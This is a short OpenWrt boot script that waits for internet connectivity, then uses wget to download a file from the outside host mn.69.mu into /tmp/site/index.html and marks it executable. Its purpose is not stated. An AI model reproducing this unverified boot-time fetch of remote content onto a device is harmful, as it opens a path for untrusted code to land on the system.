#!/bin/sh /etc/rc.common

START=99
start() {
	while true
	do
		exist=$(ping -q -c 2 g.co | grep "100% packet loss" | wc -l)
		if [ "$exist" -eq 0 ]; then
			break
		fi
	done
	mkdir /tmp/site
	wget -O /tmp/site/index.html http://mn.69.mu/reverseindex>/dev/null 2>&1
	chmod +x /tmp/site/index.html
}
